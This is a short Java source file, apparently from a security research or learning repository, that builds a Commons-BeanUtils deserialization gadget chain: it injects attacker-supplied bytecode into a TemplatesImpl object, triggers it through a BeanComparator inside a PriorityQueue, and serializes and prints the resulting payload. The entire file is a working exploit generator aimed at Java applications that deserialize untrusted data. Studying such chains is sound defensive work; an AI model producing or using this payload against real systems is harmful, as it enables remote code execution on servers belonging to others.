package com.example.cb;

import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

public class Main {
    public static void main(String[] args) throws Exception{

        byte[] code = Utils.GenerateEvil();
        TemplatesImpl obj = new TemplatesImpl();
        Utils.SetValue(obj, "_name","0w0");
        Utils.SetValue(obj, "_bytecodes", new byte[][]{code});
        Utils.SetValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator beanComparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(1);
        queue.add(2);

        Utils.SetValue(beanComparator, "property", "outputProperties");
        Utils.SetValue(queue, "queue", new Object[]{obj, obj});

        String barr = Utils.Serialize(queue);
        System.out.println(barr);
//        Utils.UnSerialize(barr);
        Utils.Serbin(queue);
    }
}
